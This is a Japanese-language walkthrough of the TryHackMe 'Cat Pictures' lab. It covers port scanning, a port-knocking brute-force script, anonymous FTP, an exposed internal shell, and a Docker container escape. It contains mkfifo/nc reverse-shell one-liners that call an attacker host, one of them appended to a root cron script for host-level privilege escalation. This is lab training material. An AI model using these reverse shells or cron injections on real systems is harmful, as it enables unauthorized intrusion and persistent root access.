# Cat Pictures CTF

https://tryhackme.com/room/catpictures

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.124.182
root@ip-10-10-49-138:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-22 08:12 GMT
Nmap scan report for 10.10.124.182
Host is up (0.00017s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   open     ssh
2375/tcp filtered docker
4420/tcp open     nvm-express
8080/tcp open     http-proxy
MAC Address: 02:97:D6:AC:21:53 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
root@ip-10-10-49-138:~# sudo nmap -sV -p21,22,2375,4420,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-22 08:13 GMT
Nmap scan report for 10.10.124.182
Host is up (0.00023s latency).

PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2375/tcp filtered docker
4420/tcp open     nvm-express?
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
```

8080ポートにブラウザでアクセスすると、phpBBというフレームワークを使っていることが分かる。  
21 と 2375 が filtered になっているのは気になるが、この時点では意味が分からなかった。

## phpBB

トピックが１件だけ投稿されている。

```text
Post cat pictures here!

Post by user » Wed Mar 24, 2021 8:33 pm
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

マジックナンバーの用途は不明。

脆弱性検索すると大量に出てくる。phpBBのバージョンが不明だが、下記のRCEが比較的新しい。

https://www.exploit-db.com/exploits/46512

Javascriptで書かれている。「Run this JS on Attachment Settings ACP page」と書いているので、添付設定ページで実行するものと思われる。であればログインが必要。しかしログイン試行回数に制限がありギブアップ。

## ポートノッキング

```text
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

ポートノッキングという初見の技術が使われていた。

特定のポートを決められた順番でノックすることで、FWが一時的にパケットを通すようになるという技術。  
knockコマンドを利用し、下記のようにスクリプト化した。

```shell
#!/bin/bash

TARGET="10.10.113.147"
PORTS=(1111 2222 3333 4444)

# すべての順列を生成する関数
permute() {
    local items=("$@")
    local num=${#items[@]}
    
    if (( num == 1 )); then
        echo "${items[0]}"
    else
        for (( i=0; i<num; i++ )); do
            local head="${items[i]}"
            local rest=("${items[@]:0:i}" "${items[@]:i+1}")  # i番目を除いたリストを作る
            while read -r p; do
                echo "$head $p"
            done < <(permute "${rest[@]}")
        done
    fi
}

# すべての順列を試す
while read -r seq; do
    echo "Trying sequence: $seq"
    knock -d 100 "$TARGET" $seq
    sleep 0.2  # ノックの処理が完了するのを待つ
done < <(permute "${PORTS[@]}")
```

これを実行すると、順番の全組み合わせを総当たりでノックする。

```shell
root@ip-10-10-69-224:~# ./port_knock.sh 
Trying sequence: 1111 2222 3333 4444
Trying sequence: 1111 2222 4444 3333
Trying sequence: 1111 3333 2222 4444
Trying sequence: 1111 3333 4444 2222
Trying sequence: 1111 4444 2222 3333
Trying sequence: 1111 4444 3333 2222
Trying sequence: 2222 1111 3333 4444
Trying sequence: 2222 1111 4444 3333
Trying sequence: 2222 3333 1111 4444
Trying sequence: 2222 3333 4444 1111
Trying sequence: 2222 4444 1111 3333
Trying sequence: 2222 4444 3333 1111
Trying sequence: 3333 1111 2222 4444
Trying sequence: 3333 1111 4444 2222
Trying sequence: 3333 2222 1111 4444
Trying sequence: 3333 2222 4444 1111
Trying sequence: 3333 4444 1111 2222
Trying sequence: 3333 4444 2222 1111
Trying sequence: 4444 1111 2222 3333
Trying sequence: 4444 1111 3333 2222
Trying sequence: 4444 2222 1111 3333
Trying sequence: 4444 2222 3333 1111
Trying sequence: 4444 3333 1111 2222
Trying sequence: 4444 3333 2222 1111
```

FTPポートにパケットが通るようになった。

```shell
TARGET=10.10.113.147
root@ip-10-10-69-224:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-23 00:36 GMT
Nmap scan report for 10.10.113.147
Host is up (0.00019s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
2375/tcp filtered docker
4420/tcp open     nvm-express
8080/tcp open     http-proxy
MAC Address: 02:B7:57:54:FA:E9 (Unknown)
```

テキストファイルをダウンロード

```shell
$ ftp 10.10.113.147
Connected to 10.10.113.147.
220 (vsFTPd 3.0.3)
Name (10.10.113.147:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||55438|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 02  2021 .
drwxr-xr-x    2 ftp      ftp          4096 Apr 02  2021 ..
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
```

note.txt
```
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is ひみつ.
- catlover
```

## 4420ポート

入手したパスワードで接続できた。

```shell
$ nc 10.10.113.147 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
ひみつ
Password accepted
pwd
/
```

/home/catlover/runme を実行するには通常のシェルが必要。

```shell
ls -al /home/catlover
total 28
drwxr-xr-x 2 0 0  4096 Apr  3  2021 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme
file -al /home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

ホームディレクトリの中に箱庭のような環境が作られている。

```shell
ls -al /
total 56
drwxr-xr-x 10 1001 1001 4096 Apr  3  2021 .
drwxr-xr-x 10 1001 1001 4096 Apr  3  2021 ..
-rw-------  1 1001 1001   50 Apr  1  2021 .bash_history
-rw-r--r--  1 1001 1001  220 Apr  1  2021 .bash_logout
-rw-r--r--  1 1001 1001 3771 Apr  1  2021 .bashrc
-rw-r--r--  1 1001 1001  807 Apr  1  2021 .profile
drwxrwxr-x  2 1001 1001 4096 Apr  2  2021 bin
drwxr-xr-x  2    0    0 4096 Apr  1  2021 etc
drwxr-xr-x  3    0    0 4096 Apr  2  2021 home
drwxr-xr-x  3    0    0 4096 Apr  2  2021 lib
drwxr-xr-x  2    0    0 4096 Apr  1  2021 lib64
drwxr-xr-x  2    0    0 4096 Apr  2  2021 opt
drwxr-xr-x  2    0    0 4096 Apr  3  2021 tmp
drwxr-xr-x  4    0    0 4096 Apr  2  2021 usr
```

使えるコマンド。

```shell
ls -al /bin
total 1520
drwxrwxr-x  2 1001 1001    4096 Apr  2  2021 .
drwxr-xr-x 10 1001 1001    4096 Apr  3  2021 ..
-rwxr-xr-x  1 1001 1001 1113504 Apr  1  2021 bash
-rwxr-xr-x  1    0    0   35064 Apr  1  2021 cat
-rwxr-xr-x  1    0    0   35000 Apr  1  2021 echo
-rwxr-xr-x  1    0    0  133792 Apr  1  2021 ls
-rwxr-xr-x  1    0    0   35312 Apr  2  2021 nc
-rwxr-xr-x  1    0    0   63704 Apr  1  2021 rm
-rwxr-xr-x  1    0    0  121432 Apr  1  2021 sh
```

```shell
ls -al /usr/bin
total 648
drwxr-xr-x 2 0 0   4096 Apr  3  2021 .
drwxr-xr-x 4 0 0   4096 Apr  2  2021 ..
-rwxr-xr-x 1 0 0  63672 Apr  3  2021 mkfifo
-rwxr-xr-x 1 0 0  88280 Apr  3  2021 touch
-rwxr-xr-x 1 0 0 499264 Apr  2  2021 wget
```

mkfifo もあるので、下記のリバースシェルを試す。

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6666 >/tmp/f
```

取得成功。

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.113.147] 48276
sh: 0: can't access tty; job control turned off
# 
```

runme を実行できるようになったが、パスワードが違うらしい。

```shell
# /home/catlover/runme
Please enter yout password: ひみつ
Access Denied
```

runme を strings で調べるだけでパスワードを見ることができた。

```shell
# /home/catlover/runme
Please enter yout password: ひみつ
Welcome, catlover! SSH key transfer queued! 
# 
```

id_rsa が生成されていた。

```shell
# ls -al /home/catlover
total 32
drwxr-xr-x 2 0 0  4096 Mar 23 01:03 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rw-r--r-- 1 0 0  1675 Mar 23 01:03 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme
```

この秘密鍵を kali に送り、SSH接続すると root シェルになっている。  
しかし、これはおそらく docker のコンテナOSだと思われる。

```shell
$ ssh catlover@10.10.113.147 -i ./id_rsa_cat

root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
root@7546fa2336d6:/# ls -al /root
total 24
drwx------ 1 root root 4096 Mar 25  2021 .
drwxr-xr-x 1 root root 4096 Mar 25  2021 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Mar 25  2021 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   41 Mar 25  2021 flag.txt
root@7546fa2336d6:/# cat /root/flag.txt
7cf90.............................
```

フラグ１ゲット。

## 権限昇格

docker のホストOSのroot昇格を目指す。

/etc/hosts
```shell
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.18.0.3      7546fa2336d6
```

7546fa2336d6 はコンテナOS。

clean.sh というシェルファイルがある。

```shell
root@7546fa2336d6:/# ls -al /opt/clean
total 16
drwxr-xr-x 2 root root 4096 May  1  2021 .
drwxrwxr-x 1 root root 4096 Mar 25  2021 ..
-rw-r--r-- 1 root root   27 May  1  2021 clean.sh

root@7546fa2336d6:/# cat /opt/clean/clean.sh
#!/bin/bash

rm -rf /tmp/*
```

これがどこから実行されるのかは不明だが、リバースシェルを仕込んでみる。

```shell
root@7546fa2336d6:/# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f' >> /opt/clean/clean.sh
```

成功

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.113.147] 60202
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
firewall
root.txt
# cat /root/root.txt
Congrats!!!
Here is your flag:

4a98...........................
```

ルートフラグゲット

## 振り返り

- これを Easy に分類するのは理不尽だと思う。
- ポートノッキングは完全に初見で良い勉強になった。
- コンテナからホストへの昇格について、今回はシンプルだったが、docker構成の不備によって移動できる場合もあるらしいので勉強が必要。https://www.youtube.com/watch?v=ZbHVRoWEwA8&t=367s

### clean.sh はどこから実行されていたのか？

ホストOSのcronで設定されていた。ホストOS上のディレクトリを、コンテナOSから参照できるように設定されている。

```shell
# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/2 * * * * root /bin/bash /opt/clean/clean.sh >/dev/null 2>&1
* * * * * root /bin/sleep 20; /usr/bin/python3 /opt/sshkeyfetcher/fetch.py >/dev/null 2>&1
```

```shell
# cat /opt/clean/clean.sh
#!/bin/bash

rm -rf /tmp/*
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f
```

コンテナOS上で、/proc/mounts を調べるのはヒントになるかもしれない。（理解できるとは言い難い）

```shell
root@7546fa2336d6:/# cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/TVNWEOK5TD4EEZO3S3JL6I24D4:/var/lib/docker/overlay2/l/7ELVD6UQZLOS3AQZMSTRFJSMJ3:/var/lib/docker/overlay2/l/F2UZULAJNTCSTA2CIMPGJGALZW:/var/lib/docker/overlay2/l/NFGTWWOYHJQUVPRU6TNP3ZNCAC:/var/lib/docker/overlay2/l/5Y6SRHOIWBO6MXE2OC5TYN4D2R:/var/lib/docker/overlay2/l/UX6QCYAMISGTKK3KJ6A32S6GMI:/var/lib/docker/overlay2/l/UUTBSKNFRDJJM3QCNZKWNVJRE4:/var/lib/docker/overlay2/l/ME7TNBVFCX4I4KMXBHWPIUNMQ4:/var/lib/docker/overlay2/l/CKATXQTY6XLNKW4R5W2QRU23BY:/var/lib/docker/overlay2/l/7WLR6HNVFVI7PCMMQJLOJA2QMC:/var/lib/docker/overlay2/l/6DU73WBP62M7N2HYY46YRN2CFS:/var/lib/docker/overlay2/l/OWCLCT52QW4YPKREU4TSZTVHDC:/var/lib/docker/overlay2/l/4RCGW3XST3MYDOBZGQUWBDHSBG:/var/lib/docker/overlay2/l/MTXC3ZGNWLTVL644BS2IXCGHG4:/var/lib/docker/overlay2/l/5E6FVFFNMXOHLFRVY2H4FJK36X:/var/lib/docker/overlay2/l/3CQRWJUTY2HX57S7E53WNLNYYS:/var/lib/docker/overlay2/l/AHPPI4EPGW42RHBAWZCAA63SOF:/var/lib/docker/overlay2/l/5VZNTAZCYR7ETBJCCLVJWICQMD,upperdir=/var/lib/docker/overlay2/7e0b8ac226fe33cb7fc89da143abe0afc48edaff94caea13fb9edfe03a347c48/diff,workdir=/var/lib/docker/overlay2/7e0b8ac226fe33cb7fc89da143abe0afc48edaff94caea13fb9edfe03a347c48/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/xvda1 /bitnami/phpbb ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/xvda1 /opt/clean ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/xvda1 /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/xvda1 /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/xvda1 /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
proc /proc/bus proc ro,relatime 0 0
proc /proc/fs proc ro,relatime 0 0
proc /proc/irq proc ro,relatime 0 0
proc /proc/sys proc ro,relatime 0 0
proc /proc/sysrq-trigger proc ro,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/scsi tmpfs ro,relatime 0 0
tmpfs /sys/firmware tmpfs ro,relatime 0 0
```
